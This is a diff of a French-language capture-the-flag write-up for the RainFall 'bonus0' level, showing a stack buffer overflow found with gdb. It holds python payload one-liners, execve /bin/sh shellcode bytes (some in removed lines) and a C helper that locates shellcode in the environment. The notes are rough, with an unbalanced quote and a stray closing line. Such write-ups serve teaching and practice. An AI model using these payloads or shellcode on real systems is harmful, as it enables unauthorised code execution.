@@ -1,84 +1,80 @@
+Pour une fois le programme n'attends pas d'argument.
 
-echo "python -c 'print 
-"A"*4096 + "\n" + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x10\xfc\xff\xbf"')"
+Il propose deux prompt et concatene les deux string avec un espace au milieu.
 
+bonus0@RainFall:~$ ./bonus0
+ -
+a
+ -
+b
+a b
 
+On va essayer de voir si on peut faire segfault le programme et si oui a partir de combien :
 
+La premiere entree va jusque 4096 sans segfault, par contre la deuxieme segfaut au 17e charactere.
 
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/bonus0/bonus0
+ -
+qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
+ -
+AAAAAAAAAAAAAAAAAA
+qqqqqqqqqqqqqqqqqqqqAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAA
 
+Program received signal SIGSEGV, Segmentation fault.
+0x00414141 in ?? ()
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/bonus0/bonus0
+ -
+qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
+ -
+AAAAAAAAAAAAAAAAA
+qqqqqqqqqqqqqqqqqqqqAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7e40041 in ?? () from /lib/i386-linux-gnu/libc.so.6
+(gdb)
+
+avec gdb on s'apercoit que notre overflow du buffer ecrit sur esp, et qu'un charactere de moins deplace de 4 . 
+
+(gdb) x/4s $esp-4
+0xbffff70c:	 "A"
+0xbffff70e:	 "\344\267\001"
+0xbffff712:	 ""
+0xbffff713:	 ""
+
+On va appeler l'adresse de notre shellcode de l'environnement ici comme au level 2.
 
 #include <stdio.h>
 #include <stdlib.h>
 
 int main(int argc, char *argv[])
 {
-    char* ptr = getenv("SHELL");
+    char* ptr = getenv("SHELLCODE");
     printf("%p\n", ptr);
 }
 
+>> 0xbffff803 
+l'adresse du shellcode
 
-bonus0@RainFall:/tmp$ python -c "print 'A'*4095 + '\n' + 'BBBBBBBBBBBBBBBBB'" > /tmp/test
+On va construire un payload:
 
-bonus0@RainFall:/tmp$ cat  /tmp/test - | ltrace ./bonus0
+ 4095 * A + \n  + padding + adresse du shell code 
+   premiere entree  
 
+On segfault a 17. On a vu qu'un charactere decale de 2 au lieu de 1. On veut mettre une adresse donc 4*2=8
+17-8=9
+python -c "print 'A'*4095 + '\n' + 'A'*9 + '\x03\xf8\xff\xbf'  > /tmp/test
 
-AAAAAAAAAAAAAAAAB depasse de 1 
-
-
-AAAAAAAAAAAAAAAA OK  16 charactere 18 ? > 
-
-with segfault :
-
-Breakpoint 1, 0x080484b4 in p ()
-(gdb) i r $esp
-esp            0xbffff65c	0xbffff65c
-(gdb) x/4xw $esp
-0xbffff65c:	0x08048539	0xbffff688	0x080486a0	0x00000000
-(gdb) c
-Continuing.
- -
-
-Breakpoint 1, 0x080484b4 in p ()
-(gdb) i r $esp
-esp            0xbffff65c	0xbffff65c
-(gdb) x/4xw $esp
-0xbffff65c:	0x0804854c	0xbffff69c	0x080486a0	0x00000000
-(gdb) c
+On se segfault plus, la string n'est plus assez longue ! Il suffit de rajouter nimporte quoi derriere 
 
 
+python -c "print 'A'*4095 + '\n' + 'A'*9 + '\x03\xf8\xff\xbf' + 'A'*6" > /tmp/test
 
-with 65 A 
-
-Breakpoint 1, 0x080484b4 in p ()
-(gdb) i r $esp
-esp            0xbffff65c	0xbffff65c
-(gdb) x/4xw $esp
-0xbffff65c:	0x08048539	0xbffff688	0x080486a0	0x00000000
-(gdb) c
-Continuing.
- -
-
-Breakpoint 1, 0x080484b4 in p ()
-(gdb) i r $esp
-esp            0xbffff65c	0xbffff65c
-(gdb) x/4xw $esp
-0xbffff65c:	0x0804854c	0xbffff69c	0x080486a0	0x00000000
-
-
-BFFFF65D adresse suivante 
-
-bonus0@RainFall:~$ python -c "print 'A'*4095 + '\n' + 'A'*16 + '\xff\xf8\xff\xbf'" > /tmp/test
-
-a * 16 + BFFFF65D + shellcode 
-'A'*16 + 
-'\x5d\xf6\xff\xbf' +  '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'
-
-
-
-python -c "print 'A'*4095 + '\n' + 'A'*9 + '\x03\xf8\xff\xbf' + 'C'*3000" > /tmp/test
-
-'\xff\xf8\xff\xbf'
-sh env 0xbffff8ff
 
 my sh 0xbffff803
 
@@ -86,14 +82,4 @@ python -c "print 'A'*4095 + '\n' + 'A'*16 + '\x03\xf8\xff\xbf'" > /tmp/test
 
 
 
-
-
-python -c "print 'A'*4095 + '\n' + '\x90'*42+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'+'\x60\xf5\xff\xbf'" > /tmp/test
-
-0xbffff560
-
-
-b *0x08048559
-
-
-0xbffff803
+printf(strcmp(i, '0'));
